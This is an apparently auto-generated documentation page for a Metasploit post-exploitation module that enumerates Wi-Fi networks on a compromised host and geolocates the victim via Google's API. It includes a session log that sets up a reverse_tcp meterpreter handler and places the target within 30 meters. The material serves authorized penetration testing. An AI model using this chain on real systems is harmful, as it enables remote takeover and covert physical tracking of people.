{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/multi/gather/wlan_geolocate","result":{"data":{"moduleMetadataJson":{"id":"02dcd317-b73b-505e-8800-434a3fe52062","name":"Multiplatform WLAN Enumeration and Geolocation","fullname":"post/multi/gather/wlan_geolocate","description":"Enumerate wireless networks visible to the target device.\n        Optionally geolocate the target by gathering local wireless networks and\n        performing a lookup against Google APIs.","rank":300,"fields":{"detailsSlug":"/modules/details/post/multi/gather/wlan_geolocate","documentationSlug":"/modules/documentation/post/multi/gather/wlan_geolocate","referencesSlug":"/modules/references/post/multi/gather/wlan_geolocate"},"documentation":{"html":"<h2 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h2>\n<p>  For this module to work you need a box with a wireless adapter.  The following methods are used to gather\nwireless information from the host:</p>\n<ul>\n<li>Windows: <code class=\"language-text\">netsh wlan show networks mode=bssid</code></li>\n<li>OSX: <code class=\"language-text\">/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s</code></li>\n<li>Linux: <code class=\"language-text\">iwlist scanning</code></li>\n<li>Solaris: <code class=\"language-text\">dladm scan-wifi</code></li>\n<li>BSD: <code class=\"language-text\">dmesg | grep -i wlan | cut -d &#39;:&#39; -f1 | uniq&quot;</code></li>\n<li>Android: <a href=\"https://developer.android.com/reference/android/net/wifi/WifiManager\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">WifiManager</a></li>\n</ul>\n<p>  If <code class=\"language-text\">GEOLOCATE</code> is set to true, Google's <a href=\"https://developers.google.com/maps/documentation/geolocation/intro\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GeoLocation APIs</a> are utilized.\nThese APIs require a Google <a href=\"https://developers.google.com/maps/documentation/geolocation/get-api-key\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">API key</a> to use them.  The original\nmethodology used by this module in <a href=\"https://github.com/rapid7/metasploit-framework/pull/3280\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">#3280</a>,\nwhich didn't require an API key, was found to no longer work in <a href=\"https://github.com/rapid7/metasploit-framework/issues/8928\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">#8928</a>.  </p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Obatin a meterpreter session via whatever method</li>\n<li>Do: <code class=\"language-text\">use post/multi/gather/wlan_geolocate</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">set apikey [key]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>geolocate</strong></p>\n<p>  A boolean on if wireless information should only be gathered, or the Google geolocate API should be used to geo the victim.  Defaults to <code class=\"language-text\">false</code></p>\n<p>  <strong>apikey</strong></p>\n<p>  A string containing the Google provided geolocation api key. <strong>REQUIRED</strong> if <code class=\"language-text\">geolocate</code> is set to true. Defaults to empty string</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-10\" style=\"position:relative;\"><a href=\"#windows-10\" aria-label=\"windows 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 10</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (met_rev.rc)&gt; use exploit/multi/handler\nresource (met_rev.rc)&gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nresource (met_rev.rc)&gt; setg lhost 2.2.2.2\nlhost =&gt; 2.2.2.2\nresource (met_rev.rc)&gt; set lport 9876\nlport =&gt; 9876\nresource (met_rev.rc)&gt; setg verbose true\nverbose =&gt; true\nresource (met_rev.rc)&gt; exploit\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 2.2.2.2:9876 \n[*] Sending stage (179267 bytes) to 1.1.1.1\n[*] Meterpreter session 1 opened (2.2.2.2:9876 -&gt; 1.1.1.1:16111) at 2017-10-01 19:27:15 -0400\n\nresource (met_rev.rc)&gt; use post/multi/gather/wlan_geolocate\nresource (met_rev.rc)&gt; set geolocate true\ngeolocate =&gt; true\nresource (met_rev.rc)&gt; set session 1\nsession =&gt; 1\nresource (met_rev.rc)&gt; set apikey ANza1yFLhaK3lreck7N3S_GYbEtJE3gGg5dJe12\napikey =&gt; ANza1yFLhaK3lreck7N3S_GYbEtJE3gGg5dJe12\nmsf post(wlan_geolocate) &gt; run\n[+] Wireless list saved to loot.\n[*] Google indicates the device is within 30.0 meters of 30.3861197,-97.7385878.\n[*] Google Maps URL:  https://maps.google.com/?q=30.3861197,-97.7385878\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"02dcd317-b73b-505e-8800-434a3fe52062"}}}